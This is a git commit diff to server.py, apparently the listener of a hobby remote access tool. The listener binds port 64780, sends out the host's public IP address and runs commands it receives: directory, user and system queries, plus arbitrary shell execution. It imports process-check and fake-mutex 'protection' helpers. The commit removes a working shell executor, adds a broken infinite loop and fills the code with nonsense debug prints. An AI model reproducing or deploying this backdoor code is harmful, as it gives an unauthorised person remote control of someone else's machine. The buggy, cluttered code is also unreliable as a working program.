84fd511738d10d317004fc5ad88dc110cd15a328
Thijs Takken <23289714+thijstakken@users.noreply.github.com>
2024-02-20 21:31:42 +0100

    watch your profanity

--- server.py
+++ server.py
@@ -1,10 +1,12 @@
 import json, os, subprocess, socket
 from resources.misc import sysinfo
+#from socket import * #socket, AF_INET, SOCK_STREAM
 from resources.protection import proc_check, fake_mutex_code
 from requests import get
 
 port = 64780
-connection = False
+#host_IP = "127.0.0.1"  # need to be loopback
+connection = "nope"
 
 #if proc_check():
 #    os.exit(0)
@@ -13,57 +15,79 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.bind(('', port))
     s.listen(2)
     conn, addr = s.accept()
+    #s.setblocking(False)
+    #s.listen(2)
+    #print("started listening")
+    #conn, addr = s.accept()
 
     while True:
         cmnd = ""
         try:
-            if connection == False:
-                connection = True
+            if connection == "nope":
+                #print(connection)
+                #s.listen(2)
+                #conn, addr = s.accept()
+                print("starting server")
+                print("listening")
+                connection = "yep"
+                print(connection)
                 ip = get('https://api.ipify.org').text
                 conn.sendall(bytes(ip, encoding="utf-8"))
                 cmnd = conn.recv(2048).decode('utf-8')
+                print(cmnd)
+                #cmnd = cmnd.decode('utf-8')
+                print(cmnd)
                 if not cmnd:
                     continue
 
             else:
+                #if not cmnd:
+                #    continue
+                print("no connection")
                 cmnd = conn.recv(2048).decode()
                 if cmnd == "reset":
-                    connection = False
-                    while connection == False:
+                    connection = "nope"
+                    while connection == "nope":
                         s.listen(2)
                         conn, addr = s.accept()
-                        connection = True
+                        connection = "yep"
+                print("ftyuik", cmnd)
+                print("cmnd = ", cmnd)
+                print("ryetsdfyhgjkk")
+
+            print(connection)
 
         except socket.error as msg:
             s.close()
             continue
+
+        #cmnd = conn.recv(2048).decode()
+        print("cmnd2 = ", cmnd)
+        #if not cmnd:
+        #    s. close
 
         if cmnd.lower() == "kill":
             print("exiting")
             s.close()
             break
         elif cmnd.lower() == "pwd":
+            print("server happy")
             result = os.path.dirname(os.path.realpath(__file__))
+            print("pls love me")
         elif cmnd.lower() == "user":
             result = os.getlogin()
         elif cmnd.lower() == "listdir":
             result = json.dumps(os.listdir())
         elif cmnd.lower() == "sysinfo":
             result = sysinfo()
-        elif cmnd.lower().startswith("shell_"):
-            try:
-                cmnd = "".join(cmnd.split("_")[1:])
-                print(cmnd)
-                result = subprocess.getoutput(cmnd)
-                print(result)
-            except Exception as e:
-                result = "command not found shell"
-                result = bytes(result, encoding="utf-8")
-
-            conn.sendall(bytes(result, encoding="utf-8"))
+        elif cmnd.lower() == "shell":
+            while True:
+                try:
+                    result = subprocess.run(cmnd)
+                except Exception:
+                    result = "command not found"
         else:
-            pass
-            # s.close()
-            # print("command not found")
+            s.close()
+            print("command not found")
 
         conn.sendall(bytes(result, encoding="utf-8"))
